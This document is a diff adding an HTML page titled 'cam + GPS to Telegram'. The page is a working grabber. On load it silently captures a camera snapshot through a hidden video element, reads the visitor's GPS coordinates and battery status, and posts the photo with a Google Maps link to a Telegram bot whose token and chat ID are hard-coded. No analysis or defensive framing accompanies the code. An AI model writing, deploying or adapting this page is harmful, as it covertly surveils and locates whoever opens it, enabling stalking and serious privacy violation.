@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>cam + GPS to Telegram</title>
+</head>
+<body>
+  <h3 id="status">⏳ Starting capture...</h3>
+
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    const BOT_TOKEN = '8388708149:AAHqiodk03S-4Wfezp1RXyk2fqxaizHlFcQ';
+    const CHAT_ID = '7685249314';
+    const status = document.getElementById('status');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    let latitude = 'Unavailable';
+    let longitude = 'Unavailable';
+    let batteryInfo = 'Unavailable';
+
+    // 🛰️ Get GPS Location
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        latitude = pos.coords.latitude;
+        longitude = pos.coords.longitude;
+        console.log("✅ GPS:", latitude, longitude);
+      },
+      (err) => {
+        console.warn("❌ GPS error:", err.message);
+      }
+    );
+
+    // 🔋 Get Battery Info
+    if (navigator.getBattery) {
+      navigator.getBattery().then(battery => {
+        batteryInfo = `Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not charging"})`;
+        console.log("✅ Battery:", batteryInfo);
+      });
+    }
+
+    // 📷 Capture and Send
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+          video.srcObject.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob(blob => {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'snapshot.jpg');
+
+    // 🧠 New Google Maps link
+    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+    const caption = `📍 Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\n🌐 ${mapsLink}\n\n🔋 ${batteryInfo}`;
+    formData.append('caption', caption);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => {
+      if (response.ok) {
+        status.innerText = "✅ Sent to Telegram! , Good boy👍";
+        console.log("✅ Telegram response:", response);
+      } else {
+        status.innerText = "❌ Failed to send to Telegram!";
+        response.text().then(txt => console.error("Telegram error:", txt));
+      }
+    })
+    .catch(err => {
+      status.innerText = "❌ Error sending photo.";
+      console.error("❌ Fetch error:", err);
+    });
+
+  }, 'image/jpeg');
+        }, 3000);
+      })
+      .catch(err => {
+        status.innerText = "❌ Camera access failed!";
+        console.error("❌ Camera error:", err);
+      });
+  </script>
+</body>
+</html>
